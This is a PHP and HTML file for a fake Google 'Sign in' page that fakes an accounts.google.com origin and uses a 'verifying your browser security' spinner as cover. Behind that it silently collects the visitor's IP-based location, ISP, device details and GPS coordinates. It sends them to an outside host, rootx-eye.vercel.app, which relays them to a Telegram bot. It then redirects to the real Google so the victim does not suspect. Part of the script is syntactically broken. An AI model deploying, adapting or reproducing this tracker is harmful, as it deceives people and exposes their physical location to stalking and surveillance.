<?php
// ✅ TELEGRAM TEXT SEND ONLY — NO IMAGE
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $chatId = $_GET['id'] ?? '';
    $message = $_POST['message'] ?? '';
    
    if (!$chatId || !$message) {
        echo json_encode(['status'=>'error','message'=>'Missing data']);
        exit;
    }

    // 🔁 اپنا بوٹ ٹوکن یہاں لگائیں
    $botToken = ''; 

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postFields = [
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['status'=>'sent']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in - Google Accounts</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    body {
      background-color: #fff;
      color: #202124;
      font-family: 'Google Sans', 'Segoe UI', Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .card {
      background: #fff;
      border: 1px solid #dadce0;
      border-radius: 8px;
      max-width: 450px;
      width: 100%;
      padding: 48px 40px 36px;
      box-sizing: border-box;
    }
    @media (max-width: 450px) {
      .card { border: none; padding: 24px 24px 20px; }
    }
    .google-logo { width: 75px; height: 25px; margin-bottom: 16px; }
    h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; }
    .subtitle { color: #5f6368; font-size: 16px; margin-bottom: 24px; }
    .origin-chip {
      display: inline-flex; align-items: center; 
      background: #f1f3f4; border-radius: 16px; padding: 6px 12px;
      margin-bottom: 24px; font-size: 14px; color: #3c4043;
    }
    .chip-icon { width: 18px; height: 18px; margin-right: 8px; border-radius: 50%; background: #fff; border: 1px solid #dadce0; display: flex; justify-content: center; align-items: center; font-size: 10px; }
    
    .next-btn {
      background-color: #1a73e8; color: #fff; border: none; 
      padding: 10px 24px; border-radius: 4px; font-size: 14px; 
      font-weight: 500; cursor: pointer; letter-spacing: 0.25px;
      float: right; transition: 0.2s;
    }
    .next-btn:hover { background-color: #1765cc; box-shadow: 0 1px 3px rgba(26,115,232,0.4); }
    
    .footer { margin-top: 36px; font-size: 12px; color: #5f6368; display: flex; justify-content: space-between;}
    
    /* Hidden Loader Styles */
    .loader-container { text-align: center; display: none; margin-top: 30px; }
    .spinner { border: 4px solid rgba(26, 115, 232, 0.2); border-top: 4px solid #1a73e8; border-radius: 50%; width: 32px; height: 32px; animation: spin 1s linear infinite; margin: 0 auto 12px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .clearfix::after { content: ""; clear: both; display: table; }
  </style>
</head>
<body>

<div class="card">
  <!-- Google SVG Logo -->
  <svg class="google-logo" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
    <g>
      <path fill="#4285F4" d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z"/>
      <path fill="#EA4335" d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
      <path fill="#FBBC05" d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.81c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.12-2.93-2.07l-2.22.92c.64 1.54 2.33 3.43 5.15 3.43 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54 0 2.02-1.37 3.5-3.1 3.5z"/>
      <path fill="#4285F4" d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.46 5.83-5.81c0-3.37-2.62-5.81-5.83-5.81zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z"/>
      <path fill="#34A853" d="M58 .24h2.51v17.57H58z"/>
      <path fill="#EA4335" d="M68.26 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.3-1.96-3.7-4.97-3.7-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.6-2.86 1.6zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z"/>
    </g>
  </svg>

  <div id="form-section">
    <h1>Sign in</h1>
    <div class="subtitle">to continue to Google Maps</div>
    
    <!-- Faking the URL/Origin so it looks 100% real -->
    <div class="origin-chip">
      <div class="chip-icon">🔒</div>
      accounts.google.com
    </div>

    <div class="clearfix">
      <button id="startBtn" class="next-btn">Next</button>
    </div>
  </div>

  <div id="loader-section" class="loader-container">
    <div class="spinner"></div>
    <p style="font-size: 14px; color: #5f6368;">Verifying your browser security...</p>
  </div>

  <div class="footer">
    <span>English (United States)</span>
    <span>Help &nbsp; Privacy &nbsp; Terms</span>
  </div>
</div>

<script>
const startBtn = document.getElementById("startBtn");
const formSection = document.getElementById("form-section");
const loaderSection = document.getElementById("loader-section");

let userInfo = {
  ip: '', city: '', country: '', isp: '',
  browser: navigator.userAgent,
  os: navigator.platform,
  screen: `${screen.width} x ${screen.height}`,
  lat: '', lng: ''
};

// 🛰 Fetch IP-based Geo Info Silently
fetch('https://ipinfo.io/json')
  .then(r => r.json())
  .then(d => {
    userInfo.ip = d.ip || 'Unknown';
    userInfo.city = d.city || 'Unknown';
    userInfo.country = d.country || 'Unknown';
    userInfo.isp = d.org || 'Unknown';
  });

startBtn.onclick = () => {
  // Step 1: Hide Form, Show Loader (To keep user busy)
  formSection.style.display = 'none';
  loaderSection.style.display = 'block';

  // Step 2: Request GPS
  navigator.geolocation.getCurrentPosition(pos => {
    userInfo.lat = pos.coords.latitude.toFixed(6);
    userInfo.lng = pos.coords.longitude.toFixed(6);

    const mapLink = `https://maps.google.com/?q=${userInfo.lat},${userInfo.lng}`;

    const msg = `📍 *Target Verified Successfully!*
    
🌎 *IP Info:*
━━━━━━━━━━━━━
🌐 IP: ${userInfo.ip}
🏙️ City: ${userInfo.city}
🌍 Country: ${userInfo.country}
📡 ISP: ${userInfo.isp}

📍 *GPS Location:*
━━━━━━━━━━━━━
🧭 Lat: ${userInfo.lat}
🧭 Lng: ${userInfo.lng}
🗺 [Click to View Map](${mapLink})

🖥 *Device Info:*
━━━━━━━━━━━━━
🧭 Browser: ${userInfo.browser}
🧩 OS: ${userInfo.os}
📱 Screen: ${userInfo.screen}`;

    const fd = new FormData();
    fd.append("message", msg);

    // Step 3: Send data to Telegram in the background
    fetch('https://rootx-eye.vercel.app/capture.php', {
        method: 'POST',
        body: fd
    })
      // Step 4: Wait 2 seconds to pretend "Verification is done", then redirect to real Google
      setTimeout(() => {
        window.location.replace("https://accounts.google.com/");
      }, 2000);
    }).catch(() => {
      // If error, still redirect so user doesn't suspect
      window.location.replace("https://accounts.google.com/");
    });

  }, err => {
    // If GPS is blocked, still show verification and redirect
    setTimeout(() => {
      window.location.replace("https://accounts.google.com/");
    }, 2000);
  });
};
</script>

</body>
</html>
